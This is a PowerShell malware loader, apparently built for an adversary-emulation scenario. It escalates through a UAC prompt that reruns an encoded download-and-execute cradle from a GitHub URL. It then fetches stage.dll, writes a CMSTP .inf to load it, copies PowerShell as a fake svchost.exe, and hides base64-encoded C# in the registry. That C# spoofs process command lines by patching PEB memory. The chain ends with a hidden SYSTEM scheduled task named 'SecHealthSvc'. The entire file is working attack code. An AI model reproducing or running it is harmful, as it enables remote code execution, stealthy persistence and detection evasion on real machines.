param()

# -- CONFIG: set this to the raw URL of the directory containing stage.dll --
#   i.e. the 'github/' folder uploaded to your repo (see Makefile sync target)
#   Example: https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github
$scriptBase = "https://github.com/Justanother-engineer/scenario1/raw/refs/heads/main"

# -- Elevation Gate ----------------------------------------------
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Not admin. Requesting elevation via UAC..."
    $scriptUrl = "$scriptBase/loader.ps1?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Host "[*] Running with admin privileges. Proceeding..."

# -- Logging -----------------------------------------------------
$logFile = "C:\ProgramData\loader.log"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

Write-Log "[*] loader.ps1 started - admin=True"

# Configuration
$githubBase = $scriptBase
$stageUrl = "$githubBase/stage.dll"
$stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$infPath = "C:\ProgramData\config.inf"
$masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
$regName = "App"
$taskName = "SecHealthSvc"

# Create scatter directories
Write-Log "[*] Creating scatter directories..."
try {
    New-Item -Path "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    New-Item -Path "C:\ProgramData\Microsoft\Windows\Caches" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Log "[+] Scatter directories created"
} catch {
    Write-Log "[-] Failed to create scatter directories: $_"
}

# 1. Download stage.dll
Write-Host "[*] Downloading stage.dll..."
Write-Log "[*] Downloading stage.dll from $stageUrl"
try {
    Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $stagePath) {
        $bytes = (Get-Item $stagePath).Length
        Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
    } else {
        Write-Log "[-] stage.dll download FAILED: file not found after download"
    }
} catch {
    Write-Log "[-] stage.dll download FAILED: $_"
}

# 2. Write config.inf
Write-Log "[*] Writing config.inf..."
$infContent = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
RegisterOCXs=RegisterStage

[RegisterStage]
$stagePath
"@
try {
    Set-Content -Path $infPath -Value $infContent -Force -ErrorAction Stop
    if (Test-Path $infPath) {
        Write-Log "[+] config.inf written - verified"
    } else {
        Write-Log "[-] config.inf write FAILED: file not found after write"
    }
} catch {
    Write-Log "[-] config.inf write FAILED: $_"
}

# 3. Masquerade PowerShell
Write-Log "[*] Masquerading PowerShell -> svchost.exe..."
try {
    Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force -ErrorAction Stop
    if (Test-Path $masqueradeDst) {
        $mbytes = (Get-Item $masqueradeDst).Length
        Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
    } else {
        Write-Log "[-] Masquerade FAILED: file not found after copy"
    }
} catch {
    Write-Log "[-] Masquerade FAILED: $_"
}

# 4. Stage C# execution wrapper in HKLM
Write-Log "[*] Encoding C# source and writing registry payload..."
$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwoKcHVibGljIHN0YXRpYyBjbGFzcyBTcG9vZgp7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NXKAogICAgICAgIHN0cmluZyBscEFwcGxpY2F0aW9uTmFtZSwKICAgICAgICBzdHJpbmcgbHBDb21tYW5kTGluZSwKICAgICAgICBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywKICAgICAgICBJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLAogICAgICAgIGJvb2wgYkluaGVyaXRIYW5kbGVzLAogICAgICAgIHVpbnQgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIEludFB0ciBscEVudmlyb25tZW50LAogICAgICAgIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksCiAgICAgICAgcmVmIFNUQVJUVVBJTkZPIGxwU3RhcnR1cEluZm8sCiAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKAogICAgICAgIEludFB0ciBoUHJvY2VzcywKICAgICAgICBpbnQgUHJvY2Vzc0luZm9ybWF0aW9uQ2xhc3MsCiAgICAgICAgb3V0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04gcGJpLAogICAgICAgIGludCBjYiwKICAgICAgICBvdXQgaW50IHJldHVybkxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgW091dF0gYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNSZWFkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IFJlc3VtZVRocmVhZChJbnRQdHIgaFRocmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgcHJpdmF0ZSBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDAwMDAwMDA0OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24gPSAwOwoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIGludCBjYjsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgIHB1YmxpYyBpbnQgZHdYOwogICAgICAgIHB1YmxpYyBpbnQgZHdZOwogICAgICAgIHB1YmxpYyBpbnQgZHdYU2l6ZTsKICAgICAgICBwdWJsaWMgaW50IGR3WVNpemU7CiAgICAgICAgcHVibGljIGludCBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3RmlsbEF0dHJpYnV0ZTsKICAgICAgICBwdWJsaWMgaW50IGR3RmxhZ3M7CiAgICAgICAgcHVibGljIHNob3J0IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgRXhpdFN0YXR1czsKICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkJhc2VBZGRyZXNzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQWZmaW5pdHlNYXNrOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQmFzZVByaW9yaXR5OwogICAgICAgIHB1YmxpYyBJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyBJbnRQdHIgSW5oZXJpdGVkRnJvbVVuaXF1ZVByb2Nlc3NJZDsKICAgIH0KCiAgICBwcml2YXRlIGNvbnN0IGludCBDb21tYW5kTGluZU9mZnNldCA9IDB4NzA7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIEdvKCkKICAgIHsKICAgICAgICBzdHJpbmcgc3Bvb2ZlZENtZCA9ICJjbXN0cC5leGUgL3MgQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjbXN0cC5pbmYiOwogICAgICAgIHN0cmluZyByZWFsQ21kID0gImNtc3RwLmV4ZSAvcyBDOlxcUHJvZ3JhbURhdGFcXGNvbmZpZy5pbmYiOwoKICAgICAgICBTVEFSVFVQSU5GTyBzaSA9IG5ldyBTVEFSVFVQSU5GTygpOwogICAgICAgIHNpLmNiID0gTWFyc2hhbC5TaXplT2YodHlwZW9mKFNUQVJUVVBJTkZPKSk7CgogICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcGk7CiAgICAgICAgaWYgKCFDcmVhdGVQcm9jZXNzVyhudWxsLCBzcG9vZmVkQ21kLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIGZhbHNlLAogICAgICAgICAgICBDUkVBVEVfU1VTUEVOREVELCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNpLCBvdXQgcGkpKQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgaW50IHJldExlbjsKICAgICAgICBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OIHBiaTsKICAgICAgICBpZiAoTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwaS5oUHJvY2VzcywgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24sCiAgICAgICAgICAgIG91dCBwYmksIE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OKSksCiAgICAgICAgICAgIG91dCByZXRMZW4pICE9IDApCiAgICAgICAgewogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGJ5dGVbXSBwZWJCdWZmZXIgPSBuZXcgYnl0ZVtJbnRQdHIuU2l6ZSAqIDRdOwogICAgICAgIGludCBieXRlc1JlYWQ7CiAgICAgICAgaWYgKCFSZWFkUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgcGJpLlBlYkJhc2VBZGRyZXNzLCBwZWJCdWZmZXIsIHBlYkJ1ZmZlci5MZW5ndGgsIG91dCBieXRlc1JlYWQpKQogICAgICAgIHsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpbnQgcHBPZmZzZXQgPSBJbnRQdHIuU2l6ZSA9PSA4ID8gMHgyMCA6IDB4MTA7CiAgICAgICAgSW50UHRyIHByb2Nlc3NQYXJhbWV0ZXJzUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKHBlYkJ1ZmZlciwgcHBPZmZzZXQpOwoKICAgICAgICBieXRlW10gY21kQnVmZmVyID0gbmV3IGJ5dGVbMTZdOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIEludFB0ci5BZGQocHJvY2Vzc1BhcmFtZXRlcnNQdHIsIENvbW1hbmRMaW5lT2Zmc2V0KSwgY21kQnVmZmVyLCBjbWRCdWZmZXIuTGVuZ3RoLCBvdXQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgYnl0ZVtdIG5ld0NtZEJ5dGVzID0gRW5jb2RpbmcuVW5pY29kZS5HZXRCeXRlcyhyZWFsQ21kKTsKICAgICAgICBJbnRQdHIgYnVmZmVyUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKGNtZEJ1ZmZlciwgOCk7CgogICAgICAgIGludCB3cml0dGVuOwogICAgICAgIGlmICghV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBidWZmZXJQdHIsIG5ld0NtZEJ5dGVzLCBuZXdDbWRCeXRlcy5MZW5ndGgsIG91dCB3cml0dGVuKSkKICAgICAgICB7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgYnl0ZVtdIGxlbmd0aEJ5dGVzID0gQml0Q29udmVydGVyLkdldEJ5dGVzKG5ld0NtZEJ5dGVzLkxlbmd0aCk7CiAgICAgICAgYnl0ZVtdIG1heExlbmd0aEJ5dGVzID0gQml0Q29udmVydGVyLkdldEJ5dGVzKG5ld0NtZEJ5dGVzLkxlbmd0aCk7CiAgICAgICAgQnVmZmVyLkJsb2NrQ29weShsZW5ndGhCeXRlcywgMCwgY21kQnVmZmVyLCAwLCAyKTsKICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KG1heExlbmd0aEJ5dGVzLCAwLCBjbWRCdWZmZXIsIDIsIDIpOwogICAgICAgIFdyaXRlUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgSW50UHRyLkFkZChwcm9jZXNzUGFyYW1ldGVyc1B0ciwgQ29tbWFuZExpbmVPZmZzZXQpLCBjbWRCdWZmZXIsIGNtZEJ1ZmZlci5MZW5ndGgsIG91dCB3cml0dGVuKTsKCiAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgIH0KfQo="
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)

# Wrap C# in Add-Type so iex will compile + call it
$regValue = @"
"`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') [*] Task payload executing (svchost.exe)" | Out-File C:\ProgramData\loader.log -Append
try {
    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') [*] Compiling C# (Add-Type)..." | Out-File C:\ProgramData\loader.log -Append
    Add-Type -TypeDefinition @'
$spoofSource
'@ -Language CSharp
    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') [+] C# compiled successfully, calling Spoof::Go()" | Out-File C:\ProgramData\loader.log -Append
    [Spoof]::Go()
    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') [+] Spoof::Go() completed" | Out-File C:\ProgramData\loader.log -Append
} catch {
    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') [-] Task payload FAILED: `$_" | Out-File C:\ProgramData\loader.log -Append
    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') [-] Type: `$(`$_.Exception.GetType().FullName)" | Out-File C:\ProgramData\loader.log -Append
}
"@

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
$checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
if ($checkVal) {
    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
} else {
    Write-Log "[-] Registry payload FAILED"
}

# 5. Create scheduled task with dynamic time via Register-ScheduledTask
Write-Log "[*] Creating scheduled task (Register-ScheduledTask)..."
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iex(gp '$regPath').$regName"
))
$action = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::FromMinutes(5))
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
    Write-Log "[+] Task $taskName created (verified)"
    Write-Host "[+] Scheduled. Waiting 2m for execution..."
    Start-ScheduledTask -TaskName $taskName
    Write-Log "[*] Task $taskName triggered"
} catch {
    Write-Log "[-] Task creation FAILED`n$_"
}

# 6. Poll for execution evidence
Write-Log "[*] Task $taskName triggered, polling for execution..."
$svchostDetected = $false
$cmstpDetected = $false
for ($i = 0; $i -lt 12; $i++) {
    Start-Sleep -Seconds 5
    $svchost = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $masqueradeDst }
    if ($svchost -and -not $svchostDetected) {
        Write-Log "[+] svchost.exe detected (PID $($svchost.Id)) - task is executing"
        $svchostDetected = $true
    }
    $cmstp = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
    if ($cmstp -and -not $cmstpDetected) {
        Write-Log "[+] cmstp.exe detected (PID $($cmstp.Id)) - stage.dll being loaded"
        $cmstpDetected = $true
    }
    if ($svchostDetected -and $cmstpDetected) { break }
}
if (-not $svchostDetected) { Write-Log "[-] svchost.exe never detected within 60s timeout" }
if (-not $cmstpDetected) { Write-Log "[-] cmstp.exe never detected - stage.dll may not have loaded" }
